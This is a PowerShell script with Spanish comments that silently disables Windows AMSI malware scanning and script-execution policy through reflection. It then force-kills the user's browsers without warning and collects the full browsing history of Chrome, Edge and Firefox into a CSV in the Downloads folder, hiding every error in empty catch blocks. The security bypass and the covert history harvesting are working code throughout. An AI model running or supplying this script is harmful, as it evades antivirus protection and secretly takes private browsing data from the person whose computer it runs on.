# Autobypass silencioso (colocar al inicio)
try {
    $null = [Reflection.Assembly]::Load("System.Core")
    $policyField = [PSObject].Assembly.GetType(
        'System.Management.Automation.Utils'
    ).GetField('cachedGroupPolicySettings', 'NonPublic,Static')
    $policyField.SetValue($null, @{ 'ScriptExecution' = @{ 'EnableScripts' = '1' } })
    
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField(
        'amsiInitFailed', 'NonPublic,Static'
    ).SetValue($null, $true)
}
catch { }

# Cerrar navegadores silenciosamente
$browsers = 'chrome', 'msedge', 'firefox', 'msedgewebview2'
$browsers | ForEach-Object {
    try { Stop-Process -Name $_ -Force -ErrorAction Stop }
    catch { }
}
Start-Sleep -Seconds 1

# Función para obtener historiales
function Get-BrowserHistory {
    param($browser, $path, $query)
    
    try {
        $tempFile = "$env:TEMP\$([Guid]::NewGuid())"
        Copy-Item $path $tempFile -Force
        
        Import-Module PSSQLite -ErrorAction Stop
        Invoke-SqliteQuery -DataSource $tempFile -Query $query | ForEach-Object {
            [PSCustomObject]@{
                Browser = $browser
                URL     = $_.url
                Title   = $_.title
                Visits  = $_.visit_count
                LastVisited = if ($browser -eq 'Firefox') {
                    [DateTime]::new(1970,1,1).AddMilliseconds($_.visit_date)
                } else {
                    [DateTime]::FromFileTime(($_.last_visit_time * 10) + 116444736000000000)
                }
            }
        }
        Remove-Item $tempFile -Force
    }
    catch { }
}

# Recolectar todos los historiales
$historial = @()

# Chrome
$historial += Get-BrowserHistory -browser 'Chrome' `
    -path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History" `
    -query "SELECT url, title, last_visit_time, visit_count FROM urls"

# Edge
$historial += Get-BrowserHistory -browser 'Edge' `
    -path "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History" `
    -query "SELECT url, title, last_visit_time, visit_count FROM urls"

# Firefox
$firefoxPath = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\places.sqlite" |
               Select-Object -First 1 -ExpandProperty FullName
$historial += Get-BrowserHistory -browser 'Firefox' -path $firefoxPath -query @"
    SELECT p.url, p.title, v.visit_date, COUNT(p.id) as visit_count 
    FROM moz_places p 
    JOIN moz_historyvisits v ON p.id = v.place_id 
    GROUP BY p.id
"@

# Exportar a CSV
$historial | Export-Csv "$env:USERPROFILE\Downloads\HistorialNavegacion.csv" -NoTypeInformation